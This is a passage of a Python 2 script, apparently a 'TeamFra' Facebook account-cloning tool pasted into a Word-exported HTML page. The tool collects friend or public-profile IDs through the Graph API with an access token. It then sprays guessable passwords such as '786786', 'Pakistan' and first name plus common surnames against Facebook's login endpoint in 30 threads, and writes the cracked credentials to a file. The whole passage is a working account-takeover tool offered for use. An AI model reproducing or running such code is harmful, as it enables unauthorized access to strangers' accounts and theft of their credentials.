\033[1;91m0.\033[1;91mExit            &quot;</p>

<p class=MsoNormal>                pilih()</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>def pilih():</p>

<p class=MsoNormal>                unikers = raw_input(&quot;\n\033[1;91mChoose
an Option&gt;&gt;&gt; \033[1;97m&quot;)</p>

<p class=MsoNormal>                if unikers ==&quot;&quot;:</p>

<p class=MsoNormal>                                print &quot;\x1b[1;91mFill
in correctly&quot;</p>

<p class=MsoNormal>                                pilih()</p>

<p class=MsoNormal>                elif unikers ==&quot;1&quot;:</p>

<p class=MsoNormal>                                super()</p>

<p class=MsoNormal>                elif unikers ==&quot;0&quot;:</p>

<p class=MsoNormal>                                jalan('Token Removed')</p>

<p class=MsoNormal>                                os.system('rm -rf
login.txt')</p>

<p class=MsoNormal>                                keluar()</p>

<p class=MsoNormal>                else:</p>

<p class=MsoNormal>                                print &quot;\x1b[1;91mFill
in correctly&quot;</p>

<p class=MsoNormal>                                pilih()</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>def super():</p>

<p class=MsoNormal>                global toket</p>

<p class=MsoNormal>                os.system('clear')</p>

<p class=MsoNormal>                try:</p>

<p class=MsoNormal>                                toket=open('login.txt','r').read()</p>

<p class=MsoNormal>                except IOError:</p>

<p class=MsoNormal>                                print&quot;\x1b[1;91mToken
invalid&quot;</p>

<p class=MsoNormal>                                os.system('rm -rf
login.txt')</p>

<p class=MsoNormal>                                time.sleep(1)</p>

<p class=MsoNormal>                                login()</p>

<p class=MsoNormal>                os.system('clear')</p>

<p class=MsoNormal>                print logo</p>

<p class=MsoNormal>                print &quot;\033[1;96m--\033[1;92m&gt;
\033[1;92m1.\x1b[1;91mClone From Friend List...&quot;</p>

<p class=MsoNormal>                print &quot;\033[1;96m--\033[1;92m&gt;
\033[1;92m2.\x1b[1;91mClone From Public ID...&quot;</p>

<p class=MsoNormal>                print &quot;\033[1;96m--\033[1;91m&gt;
\033[1;91m0.\033[1;94mBack&quot;</p>

<p class=MsoNormal>                pilih_super()</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>def pilih_super():</p>

<p class=MsoNormal>                peak = raw_input(&quot;\n\033[1;97mChoose an
Option&gt;&gt;&gt; \033[1;97m&quot;)</p>

<p class=MsoNormal>                if peak ==&quot;&quot;:</p>

<p class=MsoNormal>                                print &quot;\x1b[1;91mFill
in correctly&quot;</p>

<p class=MsoNormal>                                pilih_super()</p>

<p class=MsoNormal>                elif peak ==&quot;1&quot;:</p>

<p class=MsoNormal>                                os.system('clear')</p>

<p class=MsoNormal>                                print logo</p>

<p class=MsoNormal>                                print &quot;\033[1;95m<span
style='font-family:"Cambria Math","serif"'>&#9825;</span>&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;•<span
style='font-family:"MS Gothic"'>&#9672;</span>•&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;<span
style='font-family:"Cambria Math","serif"'>&#9825;</span>\033[1;96mTeamFra\033[1;95m<span
style='font-family:"Cambria Math","serif"'>&#9825;</span>&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;•<span
style='font-family:"MS Gothic"'>&#9672;</span>•&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;<span
style='font-family:"Cambria Math","serif"'>&#9825;</span>&quot;</p>

<p class=MsoNormal>                                jalan('\033[1;93mGetting IDs
\033[1;97m...')</p>

<p class=MsoNormal>                                <span lang=PT-BR>r =
requests.get(&quot;https://graph.facebook.com/me/friends?access_token=&quot;+toket)</span></p>

<p class=MsoNormal><span lang=PT-BR>                                </span>z =
json.loads(r.text)</p>

<p class=MsoNormal>                                for s in z['data']:</p>

<p class=MsoNormal>                                                id.append(s['id'])</p>

<p class=MsoNormal>                elif peak ==&quot;2&quot;:</p>

<p class=MsoNormal>                                os.system('clear')</p>

<p class=MsoNormal>                                print logo</p>

<p class=MsoNormal>                                idt =
raw_input(&quot;\033[1;96m[<span style='font-family:"Cambria Math","serif"'>&#9825;</span>]
\033[1;92mEnter ID\033[1;93m: \033[1;97m&quot;)</p>

<p class=MsoNormal>                                print &quot;\033[1;95m<span
style='font-family:"Cambria Math","serif"'>&#9825;</span>&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;•<span
style='font-family:"MS Gothic"'>&#9672;</span>•&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;<span
style='font-family:"Cambria Math","serif"'>&#9825;</span>\033[1;96mTeamFra\033[1;95m<span
style='font-family:"Cambria Math","serif"'>&#9825;</span>&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;•<span
style='font-family:"MS Gothic"'>&#9672;</span>•&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;<span
style='font-family:"MS Gothic"'>&#9583;&#9825;</span>&quot;</p>

<p class=MsoNormal>                                try:</p>

<p class=MsoNormal>                                                jok =
requests.get(&quot;https://graph.facebook.com/&quot;+idt+&quot;?access_token=&quot;+toket)</p>

<p class=MsoNormal>                                                op =
json.loads(jok.text)</p>

<p class=MsoNormal>                                                print&quot;\033[1;93mName\033[1;93m:\033[1;97m
&quot;+op[&quot;name&quot;]</p>

<p class=MsoNormal>                                except KeyError:</p>

<p class=MsoNormal>                                                print&quot;\x1b[1;92mID
Not Found!&quot;</p>

<p class=MsoNormal>                                                raw_input(&quot;\n\033[1;96m[\033[1;94mBack\033[1;96m]&quot;)</p>

<p class=MsoNormal>                                                super()</p>

<p class=MsoNormal>                                print&quot;\033[1;93mGetting
IDs\033[1;93m...&quot;</p>

<p class=MsoNormal>                                <span lang=PT-BR>r =
requests.get(&quot;https://graph.facebook.com/&quot;+idt+&quot;/friends?access_token=&quot;+toket)</span></p>

<p class=MsoNormal><span lang=PT-BR>                                </span>z =
json.loads(r.text)</p>

<p class=MsoNormal>                                for i in z['data']:</p>

<p class=MsoNormal>                                                id.append(i['id'])</p>

<p class=MsoNormal>                elif peak ==&quot;0&quot;:</p>

<p class=MsoNormal>                                menu()</p>

<p class=MsoNormal>                else:</p>

<p class=MsoNormal>                                print &quot;\x1b[1;91mFill
in correctly&quot;</p>

<p class=MsoNormal>                                pilih_super()</p>

<p class=MsoNormal>                </p>

<p class=MsoNormal>                print &quot;\033[1;91mTotal IDs\033[1;93m:
\033[1;94m&quot;+str(len(id))</p>

<p class=MsoNormal>                jalan('\033[1;92mPlease Wait\033[1;93m...')</p>

<p class=MsoNormal>                titik = ['.   ','..  ','... ']</p>

<p class=MsoNormal>                for o in titik:</p>

<p class=MsoNormal>                                print(&quot;\r\033[1;91mCloning\033[1;93m&quot;+o),;sys.stdout.flush();time.sleep(1)</p>

<p class=MsoNormal>                print &quot;\n\033[1;94m«-----\x1b[1;93m<span
style='font-family:"Cambria Math","serif"'>&#9825;</span>To Stop Process Press
CTRL+Z<span style='font-family:"Cambria Math","serif"'>&#9825;</span>\033[1;94m----»&quot;</p>

<p class=MsoNormal>                print &quot;\033[1;95m<span
style='font-family:"Cambria Math","serif"'>&#9825;</span>&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;•<span
style='font-family:"MS Gothic"'>&#9672;</span>•&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;<span
style='font-family:"Cambria Math","serif"'>&#9825;</span>\033[1;96mTeamFra\033[1;95m<span
style='font-family:"Cambria Math","serif"'>&#9825;</span>&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;•<span
style='font-family:"MS Gothic"'>&#9672;</span>•&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;<span
style='font-family:"Cambria Math","serif"'>&#9825;</span>&quot;</p>

<p class=MsoNormal>                jalan(' \033[1;93m ........Cloning Start
plzzz Wait.......... ')</p>

<p class=MsoNormal>                print &quot;\033[1;95m<span
style='font-family:"Cambria Math","serif"'>&#9825;</span>&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;•<span
style='font-family:"MS Gothic"'>&#9672;</span>•&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;<span
style='font-family:"Cambria Math","serif"'>&#9825;</span>\033[1;96mTeamFra\033[1;95m<span
style='font-family:"Cambria Math","serif"'>&#9825;</span>&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;•<span
style='font-family:"MS Gothic"'>&#9672;</span>•&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;<span
style='font-family:"Cambria Math","serif"'>&#9825;</span>&quot;</p>

<p class=MsoNormal>                </p>

<p class=MsoNormal>                                                </p>

<p class=MsoNormal>                def main(arg):</p>

<p class=MsoNormal>                                global cekpoint,oks</p>

<p class=MsoNormal>                                user = arg</p>

<p class=MsoNormal>                                try:</p>

<p class=MsoNormal>                                                os.mkdir('out')</p>

<p class=MsoNormal>                                except OSError:</p>

<p class=MsoNormal>                                                pass
#Dev:Team_Fra</p>

<p class=MsoNormal>                                try:</p>

<p class=MsoNormal>                                                a =
requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)</p>

<p class=MsoNormal>                                                b =
json.loads(a.text)</p>

<p class=MsoNormal>                                                pass1 =
('786786')</p>

<p class=MsoNormal>                                                data =
urllib.urlopen(&quot;https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&amp;format=json&amp;sdk_version=2&amp;email=&quot;+(user)+&quot;&amp;locale=en_US&amp;password=&quot;+(pass1)+&quot;&amp;sdk=ios&amp;generate_session_cookies=1&amp;sig=3f555f99fb61fcd7aa0c44f58f522ef6&quot;)</p>

<p class=MsoNormal>                                                q =
json.load(data)</p>

<p class=MsoNormal>                                                if
'access_token' in q:</p>

<p class=MsoNormal>                                                                print
'\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m<span style='font-family:"MS Gothic"'>&#10023;</span>\x1b[1;97m-'
+ user + '-\x1b[1;94m<span style='font-family:"MS Gothic"'>&#10023;</span>\x1b[1;97m-'
+ pass1</p>

<p class=MsoNormal>                                                                oks.append(user+pass1)</p>

<p class=MsoNormal>                                                else:</p>

<p class=MsoNormal>                                                                if
'www.facebook.com' in q[&quot;error_msg&quot;]:</p>

<p class=MsoNormal>                                                                                print
'\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m<span style='font-family:"MS Gothic"'>&#10023;</span>\x1b[1;97m-'
+ user + '-\x1b[1;94m<span style='font-family:"MS Gothic"'>&#10023;</span>\x1b[1;97m-'
+ pass1</p>

<p class=MsoNormal>                                                                                cek
= open(&quot;out/checkpoint.txt&quot;, &quot;a&quot;)</p>

<p class=MsoNormal>                                                                                <span
lang=PT-BR>cek.write(user+&quot;|&quot;+pass1+&quot;\n&quot;)</span></p>

<p class=MsoNormal><span lang=PT-BR>                                                                                </span>cek.close()</p>

<p class=MsoNormal>                                                                                cekpoint.append(user+pass1)</p>

<p class=MsoNormal>                                                                else:</p>

<p class=MsoNormal>                                                                                pass2
= 'Pakistan'</p>

<p class=MsoNormal>                                                                                data
=
urllib.urlopen(&quot;https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&amp;format=json&amp;sdk_version=2&amp;email=&quot;+(user)+&quot;&amp;locale=en_US&amp;password=&quot;+(pass2)+&quot;&amp;sdk=ios&amp;generate_session_cookies=1&amp;sig=3f555f99fb61fcd7aa0c44f58f522ef6&quot;)</p>

<p class=MsoNormal>                                                                                q
= json.load(data)</p>

<p class=MsoNormal>                                                                                if
'access_token' in q:</p>

<p class=MsoNormal>                                                                                                print
'\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m<span style='font-family:"MS Gothic"'>&#10023;</span>\x1b[1;97m-'
+ user + '-\x1b[1;94m<span style='font-family:"MS Gothic"'>&#10023;</span>\x1b[1;97m-'
+ pass2</p>

<p class=MsoNormal>                                                                                                oks.append(user+pass2)</p>

<p class=MsoNormal>                                                                                else:</p>

<p class=MsoNormal>                                                                                                if
'www.facebook.com' in q[&quot;error_msg&quot;]:</p>

<p class=MsoNormal>                                                                                                                print
'\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m<span style='font-family:"MS Gothic"'>&#10023;</span>\x1b[1;97m-'
+ user + '-\x1b[1;94m<span style='font-family:"MS Gothic"'>&#10023;</span>\x1b[1;97m-'
+ pass2</p>

<p class=MsoNormal>                                                                                                                cek
= open(&quot;out/checkpoint.txt&quot;, &quot;a&quot;)</p>

<p class=MsoNormal>                                                                                                                <span
lang=PT-BR>cek.write(user+&quot;|&quot;+pass2+&quot;\n&quot;)</span></p>

<p class=MsoNormal><span lang=PT-BR>                                                                                                                </span>cek.close()</p>

<p class=MsoNormal>                                                                                                                cekpoint.append(user+pass2)</p>

<p class=MsoNormal>                                                                                                else:</p>

<p class=MsoNormal>                                                                                                                pass3
= a['first_name'] + 'rajpoot'</p>

<p class=MsoNormal>                                                                                                                <span
lang=PT-BR>data = urllib.urlopen(&quot;https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&amp;format=json&amp;sdk_version=2&amp;email=&quot;+(user)+&quot;&amp;locale=en_US&amp;password=&quot;+(pass3)+&quot;&amp;sdk=ios&amp;generate_session_cookies=1&amp;sig=3f555f99fb61fcd7aa0c44f58f522ef6&quot;)</span></p>

<p class=MsoNormal><span lang=PT-BR>                                                                                                                </span>q
= json.load(data)</p>

<p class=MsoNormal>                                                                                                                if
'access_token' in q:</p>

<p class=MsoNormal>                                                                                                                                print
'\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m<span style='font-family:"MS Gothic"'>&#10023;</span>\x1b[1;97m-'
+ user + '-\x1b[1;94m<span style='font-family:"MS Gothic"'>&#10023;</span>\x1b[1;97m-'
+ pass3</p>

<p class=MsoNormal>                                                                                                                                oks.append(user+pass3)</p>

<p class=MsoNormal>                                                                                                                else:</p>

<p class=MsoNormal>                                                                                                                                if
'www.facebook.com' in q[&quot;error_msg&quot;]:</p>

<p class=MsoNormal>                                                                                                                                                print
'\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m<span style='font-family:"MS Gothic"'>&#10023;</span>\x1b[1;97m-'
+ user + '-\x1b[1;94m<span style='font-family:"MS Gothic"'>&#10023;</span>\x1b[1;97m-'
+ pass3</p>

<p class=MsoNormal>                                                                                                                                                cek
= open(&quot;out/checkpoint.txt&quot;, &quot;a&quot;)</p>

<p class=MsoNormal>                                                                                                                                                <span
lang=PT-BR>cek.write(user+&quot;|&quot;+pass3+&quot;\n&quot;)</span></p>

<p class=MsoNormal><span lang=PT-BR>                                                                                                                                                </span>cek.close()</p>

<p class=MsoNormal>                                                                                                                                                cekpoint.append(user+pass3)</p>

<p class=MsoNormal>                                                                                                                                else:</p>

<p class=MsoNormal>                                                                                                                                                pass4
= b['first_name'] + 'mughal'</p>

<p class=MsoNormal>                                                                                                                                                <span
lang=PT-BR>data = urllib.urlopen(&quot;https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&amp;format=json&amp;sdk_version=2&amp;email=&quot;+(user)+&quot;&amp;locale=en_US&amp;password=&quot;+(pass4)+&quot;&amp;sdk=ios&amp;generate_session_cookies=1&amp;sig=3f555f99fb61fcd7aa0c44f58f522ef6&quot;)</span></p>

<p class=MsoNormal><span lang=PT-BR>                                                                                                                                                </span>q
= json.load(data)</p>

<p class=MsoNormal>                                                                                                                                                if
'access_token' in q:</p>

<p class=MsoNormal>                                                                                                                                                                print
'\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m<span style='font-family:"MS Gothic"'>&#10023;</span>\x1b[1;97m-'
+ user + '-\x1b[1;94m<span style='font-family:"MS Gothic"'>&#10023;</span>\x1b[1;97m-'
+ pass4</p>

<p class=MsoNormal>                                                                                                                                                                oks.append(user+pass4)</p>

<p class=MsoNormal>                                                                                                                                                else:</p>

<p class=MsoNormal>                                                                                                                                                                if
'www.facebook.com' in q[&quot;error_msg&quot;]:</p>

<p class=MsoNormal>                                                                                                                                                                                print
'\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m<span style='font-family:"MS Gothic"'>&#10023;</span>\x1b[1;97m-'
+ user + '-\x1b[1;94m<span style='font-family:"MS Gothic"'>&#10023;</span>\x1b[1;97m-'
+ pass4</p>

<p class=MsoNormal>                                                                                                                                                                                cek
= open(&quot;out/checkpoint.txt&quot;, &quot;a&quot;)</p>

<p class=MsoNormal>                                                                                                                                                                                <span
lang=PT-BR>cek.write(user+&quot;|&quot;+pass4+&quot;\n&quot;)</span></p>

<p class=MsoNormal><span lang=PT-BR>                                                                                                                                                                                </span>cek.close()</p>

<p class=MsoNormal>                                                                                                                                                                                cekpoint.append(user+pass4)</p>

<p class=MsoNormal>                                                                                                                                                                else:</p>

<p class=MsoNormal>                                                                                                                                                                                pass5
= b['first_name'] + 'malik'</p>

<p class=MsoNormal>                                                                                                                                                                                <span
lang=PT-BR>data =
urllib.urlopen(&quot;https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&amp;format=json&amp;sdk_version=2&amp;email=&quot;+(user)+&quot;&amp;locale=en_US&amp;password=&quot;+(pass5)+&quot;&amp;sdk=ios&amp;generate_session_cookies=1&amp;sig=3f555f99fb61fcd7aa0c44f58f522ef6&quot;)</span></p>

<p class=MsoNormal><span lang=PT-BR>                                                                                                                                                                                </span>q
= json.load(data)</p>

<p class=MsoNormal>                                                                                                                                                                                if
'access_token' in q:</p>

<p class=MsoNormal>                                                                                                                                                                                                print
'\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m<span style='font-family:"MS Gothic"'>&#10023;</span>\x1b[1;97m-'
+ user + '-\x1b[1;94m<span style='font-family:"MS Gothic"'>&#10023;</span>\x1b[1;97m-'
+ pass5</p>

<p class=MsoNormal>                                                                                                                                                                                                oks.append(user+pass5)</p>

<p class=MsoNormal>                                                                                                                                                                                else:</p>

<p class=MsoNormal>                                                                                                                                                                                                if
'www.facebook.com' in q[&quot;error_msg&quot;]:</p>

<p class=MsoNormal>                                                                                                                                                                                                                print
'\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m<span style='font-family:"MS Gothic"'>&#10023;</span>\x1b[1;97m-'
+ user + '-\x1b[1;94m<span style='font-family:"MS Gothic"'>&#10023;</span>\x1b[1;97m-'
+ pass5</p>

<p class=MsoNormal>                                                                                                                                                                                                                cek
= open(&quot;out/checkpoint.txt&quot;, &quot;a&quot;)</p>

<p class=MsoNormal>                                                                                                                                                                                                                <span
lang=PT-BR>cek.write(user+&quot;|&quot;+pass5+&quot;\n&quot;)</span></p>

<p class=MsoNormal><span lang=PT-BR>                                                                                                                                                                                                                </span>cek.close()</p>

<p class=MsoNormal>                                                                                                                                                                                                                cekpoint.append(user+pass5)</p>

<p class=MsoNormal>                                                                                                                                                                                                else:</p>

<p class=MsoNormal>                                                                                                                                                                                                                pass6
= b['first_name'] + 'khan'</p>

<p class=MsoNormal>                                                                                                                                                                                                                <span
lang=PT-BR>data =
urllib.urlopen(&quot;https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&amp;format=json&amp;sdk_version=2&amp;email=&quot;+(user)+&quot;&amp;locale=en_US&amp;password=&quot;+(pass6)+&quot;&amp;sdk=ios&amp;generate_session_cookies=1&amp;sig=3f555f99fb61fcd7aa0c44f58f522ef6&quot;)</span></p>

<p class=MsoNormal><span lang=PT-BR>                                                                                                                                                                                                                </span>q
= json.load(data)</p>

<p class=MsoNormal>                                                                                                                                                                                                                if
'access_token' in q:</p>

<p class=MsoNormal>                                                                                                                                                                                                                                print
'\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m<span style='font-family:"MS Gothic"'>&#10023;</span>\x1b[1;97m-'
+ user + '-\x1b[1;94m<span style='font-family:"MS Gothic"'>&#10023;</span>\x1b[1;97m-'
+ pass6</p>

<p class=MsoNormal>                                                                                                                                                                                                                                oks.append(user+pass6)</p>

<p class=MsoNormal>                                                                                                                                                                                                                else:</p>

<p class=MsoNormal>                                                                                                                                                                                                                                if
'www.facebook.com' in q[&quot;error_msg&quot;]:</p>

<p class=MsoNormal>                                                                                                                                                                                                                                                print
'\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m<span style='font-family:"MS Gothic"'>&#10023;</span>\x1b[1;97m-'
+ user + '-\x1b[1;94m<span style='font-family:"MS Gothic"'>&#10023;</span>\x1b[1;97m-'
+ pass6</p>

<p class=MsoNormal>                                                                                                                                                                                                                                                cek
= open(&quot;out/checkpoint.txt&quot;, &quot;a&quot;)</p>

<p class=MsoNormal>                                                                                                                                                                                                                                                <span
lang=PT-BR>cek.write(user+&quot;|&quot;+pass6+&quot;\n&quot;)</span></p>

<p class=MsoNormal><span lang=PT-BR>                                                                                                                                                                                                                                                </span>cek.close()</p>

<p class=MsoNormal>                                                                                                                                                                                                                                                cekpoint.append(user+pass6)</p>

<p class=MsoNormal>                                                                                                                                                                                                                                else:</p>

<p class=MsoNormal>                                                                                                                                                                                                                                                a
= requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)</p>

<p class=MsoNormal>                                                                                                                                                                                                                                                b
= json.loads(a.text)</p>

<p class=MsoNormal>                                                                                                                                                                                                                                                pass7
= b['first_name'] + 'afridi'</p>

<p class=MsoNormal>                                                                                                                                                                                                                                                data
=
urllib.urlopen(&quot;https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&amp;format=json&amp;sdk_version=2&amp;email=&quot;+(user)+&quot;&amp;locale=en_US&amp;password=&quot;+(pass7)+&quot;&amp;sdk=ios&amp;generate_session_cookies=1&amp;sig=3f555f99fb61fcd7aa0c44f58f522ef6&quot;)</p>

<p class=MsoNormal>                                                                                                                                                                                                                                                q
= json.load(data)</p>

<p class=MsoNormal>                                                                                                                                                                                                                                                if
'access_token' in q:</p>

<p class=MsoNormal>                                                                                                                                                                                                                                                                print
'\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m<span style='font-family:"MS Gothic"'>&#10023;</span>\x1b[1;97m-'
+ user + '-\x1b[1;94m<span style='font-family:"MS Gothic"'>&#10023;</span>\x1b[1;97m-'
+ pass7</p>

<p class=MsoNormal>                                                                                                                                                                                                                                                                oks.append(user+pass7)</p>

<p class=MsoNormal>                                                                                                                                                                                                                                                else:</p>

<p class=MsoNormal>                                                                                                                                                                                                                                                                if
'www.facebook.com' in q[&quot;error_msg&quot;]:</p>

<p class=MsoNormal>                                                                                                                                                                                                                                                                                print
'\x1b[1;95mCheckpoint\x1b[1;97m-\x1b[1;94m<span style='font-family:"MS Gothic"'>&#10023;</span>\x1b[1;97m-'
+ user + '-\x1b[1;94m<span style='font-family:"MS Gothic"'>&#10023;</span>\x1b[1;97m-'
+ pass7</p>

<p class=MsoNormal>                                                                                                                                                                                                                                                                                cek
= open(&quot;out/checkpoint.txt&quot;, &quot;a&quot;)</p>

<p class=MsoNormal>                                                                                                                                                                                                                                                                                <span
lang=PT-BR>cek.write(user+&quot;|&quot;+pass7+&quot;\n&quot;)</span></p>

<p class=MsoNormal><span lang=PT-BR>                                                                                                                                                                                                                                                                                </span>cek.close()</p>

<p class=MsoNormal>                                                                                                                                                                                                                                                                                cekpoint.append(user+pass7)</p>

<p class=MsoNormal>                                                                                                                                                                                                                                                                                </p>

<p class=MsoNormal>                                                                                                                                                                                                                                                </p>

<p class=MsoNormal>                                except:</p>

<p class=MsoNormal>                                                pass</p>

<p class=MsoNormal>                                </p>

<p class=MsoNormal>                p = ThreadPool(30)</p>

<p class=MsoNormal>                p.map(main, id)</p>

<p class=MsoNormal>                print &quot;\033[1;95m<span
style='font-family:"Cambria Math","serif"'>&#9825;</span>&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;•<span
style='font-family:"MS Gothic"'>&#9672;</span>•&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;<span
style='font-family:"Cambria Math","serif"'>&#9825;</span>\033[1;96mTeamFra\033[1;95m<span
style='font-family:"Cambria Math","serif"'>&#9825;</span>&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;•<span
style='font-family:"MS Gothic"'>&#9672;</span>•&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;<span
style='font-family:"Cambria Math","serif"'>&#9825;</span>&quot;</p>

<p class=MsoNormal>                print &quot;  \033[1;93m«---•<span
style='font-family:"MS Gothic"'>&#9672;</span>•---Developed By love---•<span
style='font-family:"MS Gothic"'>&#9672;</span>•---»&quot; #Dev:Team_Fra</p>

<p class=MsoNormal>                print '\033[1;91mProcess Has Been
Completed\033[1;92m....'</p>

<p class=MsoNormal>                print&quot;\033[1;91mTotal OK/\x1b[1;93mCP
\033[1;91m:
\033[1;91m&quot;+str(len(oks))+&quot;\033[1;97m/\033[1;95m&quot;+str(len(cekpoint))</p>

<p class=MsoNormal>                print &quot;&quot;&quot;</p>

<p class=MsoNormal>             </p>

<p class=MsoNormal>             ...........<span style='font-family:"Arial","sans-serif"'>&#9608;&#9608;&#9608;</span>
]<span style='font-family:"Arial","sans-serif"'>&#9604;&#9604;&#9604;&#9604;&#9604;</span><span
style='font-family:"MS Gothic"'>&#9603;</span></p>

<p class=MsoNormal>             ..<span style='font-family:"MS Gothic"'>&#9602;&#9604;&#9605;&#9608;&#9608;&#9608;&#9608;&#9608;&#9605;&#9604;&#9603;&#9602;</span></p>

<p class=MsoNormal>             [<span style='font-family:"Arial","sans-serif"'>&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;</span>]</p>

<p class=MsoNormal>             <span style='font-family:"MS Gothic"'>&#9701;&#8857;&#9650;&#8857;&#9650;&#8857;&#9650;&#8857;&#9650;&#8857;&#9650;&#8857;&#9700;</span></p>

<p class=MsoNormal><span style='font-family:"Cambria Math","serif"'>&#9825;</span>&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;•<span
style='font-family:"MS Gothic"'>&#9672;</span>•&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;<span
style='font-family:"Cambria Math","serif"'>&#9825;</span>.</p>

<p class=MsoNormal>: \033[1;96m .....TeamFra  Owners........... \033[1;93m :</p>

<p class=MsoNormal><span style='font-family:"Cambria Math","serif"'>&#9825;</span>&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;•<span
style='font-family:"MS Gothic"'>&#9672;</span>•&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;<span
style='font-family:"Cambria Math","serif"'>&#9825;</span>.' </p>

<p class=MsoNormal>                whatsapp Num</p>

<p class=MsoNormal>               +923157691248&quot;&quot;&quot;</p>

<p class=MsoNormal>                </p>

<p class=MsoNormal>                raw_input(&quot;\n\033[1;92m[\033[1;94mBack\033[1;96m]&quot;)</p>

<p class=MsoNormal>                menu()</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>if __name__ == '__main__':</p>

<p class=MsoNormal>                login()</p>

</div>

</body>

</html>
